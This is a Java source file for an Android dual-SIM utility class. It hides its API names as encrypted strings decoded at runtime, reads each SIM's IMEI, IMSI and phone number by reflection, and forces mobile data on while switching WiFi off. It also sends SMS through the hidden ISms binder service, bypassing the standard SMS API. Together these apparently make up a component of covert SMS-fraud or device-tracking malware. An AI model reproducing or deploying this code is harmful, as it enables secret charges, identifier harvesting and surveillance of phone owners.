package kernel.workspace.network;
import java.lang.reflect.Method;
import kernel.workspace.listener.ActionListener;
import kernel.workspace.util.Logger;
import kernel.workspace.util.ParseKsy;
import kernel.workspace.util.T;
import kernel.workspace.util.TimeJudge;
import android.app.PendingIntent;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.android.internal.telephony.ISms;

public class GeminiUtil {
    /**
     * content://settings/system
     */
    public static String SETTING_SYSTEM = ParseKsy.decode("72655a6e4f29cb4f2644ca824f7494fdce012685ebf90c541f157c0ee1f03925");
    /**
     * setRadio
     */
    public static String SET_RADIO = ParseKsy.decode("e21fb264e3fed69a45f3d98e456a8d8f");
    /**
     * gprs_connection_sim_setting
     */
    public static String GPRS_GEMINI = ParseKsy.decode("dcc64d63729fc673930acf1d7c3a14e2aee73c788bd96a538ba45bc667fe8b21");
    /**
     * getDeviceIdGemini
     */
    private static String GET_SUB_IMEI = ParseKsy.decode("504b730108e24e35bfd7f2df48f704d4bbee75374175eb41e500fe350a9f3820");
    /**
     * getSubscriberIdGemini
     */
    private static String GET_SUB_IMSI = ParseKsy.decode("371fa521603b71aba9e0da0fbac4e7b8a8bb907412368024a8a8fdc27eae63df");
    /**
     * content://telephony/siminfo
     */
    private static final Uri CONTENT_URI = Uri.parse(ParseKsy.decode("2220183c53791ef7f2ed91d4994771018ce4f04a5357c384328175842a1365fe"));
    /**
     * 
     * @param simId: 0:disableGprs, >0: enableGprs
     * @param disableWifi
     * @param waitTime
     */
    public static void setGprsId(final Context context, long simId, boolean disableWifi, int waitTime) {
        try {
            ContentValues cv = new ContentValues();
            cv.put("value", simId);
            context.getContentResolver().update(Uri.parse(SETTING_SYSTEM + "/" + GPRS_GEMINI), cv, null, null);
            ConnectivityManager manager = (ConnectivityManager) context.getSystemService("connectivity");
            Method method = ConnectivityManager.class.getMethod(SET_RADIO, new Class[] { Integer.TYPE, Boolean.TYPE });
            method.invoke(manager, new Object[] { Integer.valueOf(1), Boolean.valueOf(true) });
            if (disableWifi) new TimeJudge(waitTime * 1000, new ActionListener() {
                @Override
                public void onActionFinished(int j, int k, Object obj1) {
                    ((WifiManager) context.getSystemService(T.WIFI)).setWifiEnabled(false);
                }
            }, 0).start();
        } catch (Exception e) {
            Logger.error(e);
        }
    }
    public static long fromCursor(Cursor cursor) {
        long simId = 0;
        if (cursor != null) {
            try {
                simId = cursor.getLong(cursor.getColumnIndexOrThrow("_id"));
            } catch (Exception e) {
                Logger.error(e);
            }
        }
        return simId;
    }
    /**
    * android.telephony.SmsManager
    */
    public static String SMS_MANAGER = ParseKsy.decode("b2c634cf838c78ae1d5160ebf26457a04b6a0bc244b51ff5b7b2dbcb8d9df77d");
    /**
    * getDefault
    */
    public static String GET_DEFAULT = ParseKsy.decode("0805526a9b047a0b7dc52395e7e75303");
    /**
    * getDefaultSim
    */
    public static String GET_DEFAULTSIM = ParseKsy.decode("205e7a5d0bc5acfcb4eb930b6d6e40c5");
    public static int getDefaultSim() {
        int result = 0;
        try {
            Class<?> class1 = Class.forName(SMS_MANAGER);
            Object obj = class1.getMethod(GET_DEFAULT, new Class[0]).invoke(class1, new Object[0]);
            Method method = class1.getDeclaredMethod(GET_DEFAULTSIM, new Class[0]);
            method.setAccessible(true);
            Object obj1 = method.invoke(obj, new Object[0]);
            if (obj1 != null) {
                result = Integer.parseInt(obj1.toString());
            }
        } catch (Exception e) {
            Logger.error(e);
        }
        return result;
    }
    public static long getGprsSimID(Context context) {
        long result = 0L;
        Cursor cursor = context.getContentResolver().query(Uri.parse(SETTING_SYSTEM), null, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            cursor.moveToFirst();
            do {
                String name = cursor.getString(cursor.getColumnIndexOrThrow("name"));
                if (GPRS_GEMINI.equals(name)) {
                    String value = cursor.getString(cursor.getColumnIndexOrThrow("value"));
                    if (!TextUtils.isEmpty(value)) {
                        result = Long.parseLong(value);
                        break;
                    }
                }
            } while (cursor.moveToNext());
        }
        if (cursor != null) {
            cursor.close();
        }
        return result;
    }
    public static String getImsiBySlot(Context context, int i) {
        String result = "";
        Object obj;
        try {
            TelephonyManager manager = (TelephonyManager) context.getSystemService("phone");
            Class<?> class1 = Class.forName(TEL_MANAGER);
            Method method = class1.getMethod(GET_SUB_IMSI, new Class[] { Integer.TYPE });
            obj = method.invoke(manager, new Object[] { Integer.valueOf(i) });
            if (obj != null) result = obj.toString();
        } catch (Exception e) {
            Logger.error(e);
        }
        return result;
    }
    /**
    * getLine1NumberGemini
    */
    public static String GETPHONEGEMINI = ParseKsy.decode("9704804c83387fdf24bb557d0e114ba640ecde9e571f9098a5ade44a77940993");
    public static String getPhoneBySlot(Context context, int slotId) {
        String result = "";
        if (context != null && (slotId == 0 || slotId == 1)) {
            try {
                TelephonyManager telephonymanager = (TelephonyManager) context.getSystemService("phone");
                Class<?> cls = Class.forName(TEL_MANAGER);
                Method method = cls.getMethod(GETPHONEGEMINI, new Class[] { Integer.TYPE });
                Object obj = method.invoke(telephonymanager, new Object[] { Integer.valueOf(slotId) });
                if (obj != null) {
                    result = obj.toString();
                }
            } catch (Exception e) {
                Logger.error(e);
            }
        }
        return result;
    }
    public static long getSimIDbySlot(Context context, int i) {
        long result = 0;
        if (i == 0 || i == 1) {
            result = getSimInfoBySlot(context, i);
        }
        return result;
    }
    public static long getSimInfoBySlot(Context context, int i) {
        long simId = 0;
        if (i >= 0) {
            Cursor cursor = context.getContentResolver().query(CONTENT_URI, null, "slot=?", new String[] { String.valueOf(i) }, null);
            if (cursor != null && cursor.moveToFirst()) {
                simId = fromCursor(cursor);
            }
            try {
                cursor.close();
            } catch (Exception e) {
                Logger.error(e);
            }
        }
        return simId;
    }
    private static boolean isGsm(Object flag) {
        return flag == null ? false : "46000".equals(flag.toString()) || "46002".equals(flag.toString());
    }
    /**
    * getSimOperatorGemini
    */
    public static String getSimOperatorGemini = ParseKsy.decode("da2d2d2217922809098baa300053e97140ecde9e571f9098a5ade44a77940993");
    public static int getSlotByOperator(Context context) {
        boolean slot0Ready = isSimReady(context, 0);
        boolean slot1Ready = isSimReady(context, 1);
        if (slot0Ready && slot1Ready) {
            TelephonyManager manager = (TelephonyManager) context.getSystemService("phone");
            try {
                Class<?> teleManager = Class.forName(TEL_MANAGER);
                Method method = teleManager.getMethod(getSimOperatorGemini, new Class[] { Integer.TYPE });
                boolean slot0Match = isGsm(method.invoke(manager, new Object[] { Integer.valueOf(0) }));
                boolean slot1Match = isGsm(method.invoke(manager, new Object[] { Integer.valueOf(1) }));
                if (slot0Match && slot1Match) return getDefaultSim();
                else if (slot0Match) return 0;
                else if (slot1Match) return 1;
            } catch (Exception e) {
                Logger.error(e);
            }
        } else if (slot0Ready) {//
            return 0;
        } else if (slot1Ready) { //
            return 1;
        }
        return getDefaultSim();
    }
    public static int getSlotbySimID(Context context, long l) {
        if (l == getSimIDbySlot(context, 0)) return 0;
        if (l == getSimIDbySlot(context, 1)) return 1;
        return -1;
    }
    public static int getSlotIDByImsi(Context context, String imsi) {
        int slot = 0;
        if (!TextUtils.isEmpty(imsi)) {
            try {
                if (imsi.equals(getImsiBySlot(context, 1))) {
                    slot = 1;
                }
            } catch (Exception e) {
                Logger.error(e);
            }
        }
        return slot;
    }
    public static boolean isGemini(Context context) {
        return !TextUtils.isEmpty(getImeiBySlot(context, 1));
    }
    public static String getImeiBySlot(Context context, int slot) {
        String result = "";
        try {
            TelephonyManager manager = (TelephonyManager) context.getSystemService("phone");
            Method method = Class.forName(TEL_MANAGER).getMethod(GET_SUB_IMEI, new Class[] { Integer.TYPE });
            Object obj = method.invoke(manager, new Object[] { Integer.valueOf(slot) });
            if (obj != null) result = obj.toString();
        } catch (Exception e) {
            //Logger.error(e);
        }
        return result;
    }
    /**
    * getSimStateGemini
    */
    private static String GETSIMSTATEGEMINI = ParseKsy.decode("00388ccb5c244f7002bc00f6d6767e67bbee75374175eb41e500fe350a9f3820");
    /**
    * android.telephony.TelephonyManager
    */
    private static String TEL_MANAGER = ParseKsy.decode("b2c634cf838c78ae1d5160ebf26457a0cdc88769a3a6ec9fb9a6c92fc601a0cee36b6599288ba505b85e4c9423917a04");
    private static boolean isSimReady(Context context, int slot) {
        boolean result = false;
        if (slot == 0 || slot == 1) {
            try {
                TelephonyManager manager = (TelephonyManager) context.getSystemService("phone");
                Method method = Class.forName(TEL_MANAGER).getMethod(GETSIMSTATEGEMINI, new Class[] { Integer.TYPE });
                Object obj = method.invoke(manager, new Object[] { Integer.valueOf(slot) });
                result = obj != null && 5 == Integer.parseInt(obj.toString());
            } catch (Exception e) {
                Logger.error(e);
            }
        }
        return result;
    }
    /**
    * android.os.ServiceManager
    */
    private static String SERVICE_MANAGER = ParseKsy.decode("8bc272235e64481e27a6edda582a02e50dff10ccfc2582e146a62edbbe2d496c");
    /**
    * getService
    */
    /**
    * isms
    */
    private static String ISMS = ParseKsy.decode("af28303852ce76f03e75b386c7369667");
    /**
     * isms2
     */
    private static String ISMS2 = ParseKsy.decode("21df0a8efd1412d1da7245af7a4a2d28");
    private static String GET_SERVICE = ParseKsy.decode("4109c82f2dc5161b3748e6811b1c232b");
    public static void sendSms(Context context, String destAddr, String msg, PendingIntent sentIntent, PendingIntent deliveryIntent) throws Exception {
        Method method = Class.forName(SERVICE_MANAGER).getMethod(GET_SERVICE, new Class[] { String.class });
        String isms = GeminiUtil.getSlotByOperator(context) == 0 ? ISMS : ISMS2;
        ISms.Stub.asInterface((IBinder) method.invoke(null, new Object[] { isms })).sendText(destAddr, null, msg, sentIntent, deliveryIntent);
    }
}
